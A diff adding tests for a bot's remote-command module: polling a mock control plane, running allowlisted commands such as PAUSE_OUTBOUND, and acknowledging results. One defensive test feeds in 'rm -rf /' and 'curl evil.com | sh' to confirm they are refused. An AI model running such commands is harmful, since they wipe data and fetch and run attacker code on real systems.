@@ -31,6 +31,14 @@ const server = http.createServer((req, res) => {
       payload.lastSeen = new Date().toISOString()
     } else if (req.url === '/api/v1/messages') {
       payload.recorded = true
+    } else if (req.url === '/api/v1/commands/poll') {
+      payload.commands = [
+        { id: 'cmd-1', type: 'PAUSE_OUTBOUND', payload: null },
+        { id: 'cmd-2', type: 'TOTALLY_UNKNOWN', payload: null },
+        { id: 'cmd-3', type: 'SYNC_STATUS', payload: null },
+      ]
+    } else if (req.url === '/api/v1/commands/ack') {
+      payload.acked = parsed.command_id ?? parsed.commandId
     }
     res.writeHead(200, { 'Content-Type': 'application/json' })
     res.end(JSON.stringify(payload))
@@ -47,7 +55,7 @@ process.env.SESSION_SECRET = 'test-secret'
 process.env.CONTROL_URL = controlUrl
 
 const remote = await import('../lib/remote.js')
-const { setKillSwitch, isKillSwitchOn } = await import('../lib/abuse.js')
+const { setKillSwitch, isKillSwitchOn, setOutboundPaused, isOutboundPaused } = await import('../lib/abuse.js')
 const { setRuntimeOverride, getRuntimeFlag } = await import('../lib/runtime.js')
 const {
   getPrivacySettings,
@@ -167,6 +175,76 @@ test('applyRemoteBotConfig drives kill switch, privacy, and runtime flags', asyn
   setRuntimeOverride('autoTyping', null)
   setPrivacyProvider(null)
   await setPrivacySettings({ level: 'normal' })
+})
+
+test('remotePollCommands claims pending commands from the control plane', async () => {
+  const commands = await remote.remotePollCommands()
+  assert.equal(commands.length, 3)
+  assert.equal(commands[0].type, 'PAUSE_OUTBOUND')
+  assert.equal(commands[1].type, 'TOTALLY_UNKNOWN')
+  const req = lastRequest()
+  assert.equal(req.path, '/api/v1/commands/poll')
+})
+
+test('executeRemoteCommand runs whitelisted commands (PAUSE_OUTBOUND)', async () => {
+  const outcome = await remote.executeRemoteCommand({ id: 'cmd-1', type: 'PAUSE_OUTBOUND' })
+  assert.equal(outcome.handled, true)
+  assert.equal(outcome.ok, true)
+  assert.equal(isOutboundPaused(), true)
+  // Cleanup so later tests are unaffected
+  await remote.executeRemoteCommand({ id: 'x', type: 'RESUME_OUTBOUND' })
+  assert.equal(isOutboundPaused(), false)
+})
+
+test('executeRemoteCommand rejects unknown command types (no arbitrary execution)', async () => {
+  const outcome = await remote.executeRemoteCommand({ id: 'cmd-2', type: 'TOTALLY_UNKNOWN' })
+  assert.equal(outcome.handled, false)
+  assert.match(outcome.reason, /unknown command type/)
+})
+
+test('executeRemoteCommand cannot execute shell commands', async () => {
+  const shellAttempt = await remote.executeRemoteCommand({
+    id: 'evil',
+    type: 'exec',
+    payload: { command: 'rm -rf /' },
+  })
+  assert.equal(shellAttempt.handled, false)
+  const shellAttempt2 = await remote.executeRemoteCommand({
+    id: 'evil2',
+    type: 'SYSTEM',
+    payload: { cmd: 'curl evil.com | sh' },
+  })
+  assert.equal(shellAttempt2.handled, false)
+})
+
+test('executeRemoteCommand SYNC_STATUS reports via the status provider', async () => {
+  remote.setSyncStatusProvider(() => ({ whatsapp: 'connected', botStatus: 'running' }))
+  const outcome = await remote.executeRemoteCommand({ id: 'cmd-3', type: 'SYNC_STATUS' })
+  assert.equal(outcome.ok, true)
+  assert.equal(outcome.result.status.whatsapp, 'connected')
+  remote.setSyncStatusProvider(null)
+})
+
+test('remoteAckCommand acks command results (non-fatal on failure)', async () => {
+  const count = requestCount()
+  await remote.remoteAckCommand('cmd-1', true, { done: true })
+  const req = requests[count]
+  assert.equal(req.path, '/api/v1/commands/ack')
+  assert.equal(req.body.command_id, 'cmd-1')
+  assert.equal(req.body.ok, true)
+
+  // Server failure must not throw (fire-and-forget transport)
+  failMode = true
+  let threw = false
+  try {
+    await remote.remoteAckCommand('cmd-1', false, { error: 'x' })
+  } catch {
+    threw = true
+  }
+  failMode = false
+  assert.equal(threw, false)
+  // The failed attempt was still recorded as a request (transport alive)
+  assert.equal(lastRequest().path, '/api/v1/commands/ack')
 })
 
 test('initRemoteTransports wires message persistence through the control API', async () => {
